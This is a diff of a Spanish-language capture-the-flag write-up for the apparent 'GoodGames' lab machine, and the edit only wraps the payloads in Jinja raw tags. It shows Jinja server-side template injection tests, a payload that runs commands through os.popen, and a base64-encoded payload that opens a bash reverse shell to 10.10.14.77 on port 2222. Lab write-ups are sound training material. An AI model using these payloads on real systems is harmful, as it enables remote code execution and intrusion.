@@ -100,13 +100,13 @@ Ahora vemos una página de Flask Volt. Es solo una plantilla en GitHub para la p
 
 Probamos e ingresamos con credenciales por defecto.
 
-La página de configuración tiene un campo de entrada para el nombre de usuario, por lo que se prueba con la carga útil `{{7*7}}`. Debería devolver el resultado 49 en el nombre de la tarjeta de usuario.
+La página de configuración tiene un campo de entrada para el nombre de usuario, por lo que se prueba con la carga útil `{% raw %}{{7*7}}{% endraw %}`. Debería devolver el resultado 49 en el nombre de la tarjeta de usuario.
 
 ![SSTI test](/secciones/posts/imagenes/goodgames/target1.webp)
 
 ## Identificación del motor de plantillas
 
-Ahora necesitamos encontrar qué motor de plantilla está usando. Para hacerlo, podemos verificar con la carga útil `{{7*'7'}}`:
+Ahora necesitamos encontrar qué motor de plantilla está usando. Para hacerlo, podemos verificar con la carga útil `{% raw %}{{7*'7'}}{% endraw %}`:
 
 - Si devuelve el resultado 49, eso significa que está usando Twig
 - Si devuelve 7777777, entonces está usando Jinja
@@ -114,7 +114,7 @@ Ahora necesitamos encontrar qué motor de plantilla está usando. Para hacerlo, 
 Es Jinja. Ahora necesitamos buscar la carga útil para ejecutar el comando:
 
 ```python
-{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{% raw %}{% raw %}{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}{% endraw %}{% endraw %}
 ```
 
 ## Obtención de shell reverso
@@ -127,7 +127,7 @@ echo "bash -i >& /dev/tcp/10.10.14.77/2222 0>&1" | base64
 
 **Payload final:**
 ```python
-{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ny8yMjIyIDA+JjEK" |base64 -d| bash').read() }}
+{% raw %}{% raw %}{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ny8yMjIyIDA+JjEK" |base64 -d| bash').read() }}{% endraw %}{% endraw %}
 ```
 
 ## Reconocimiento del contenedor
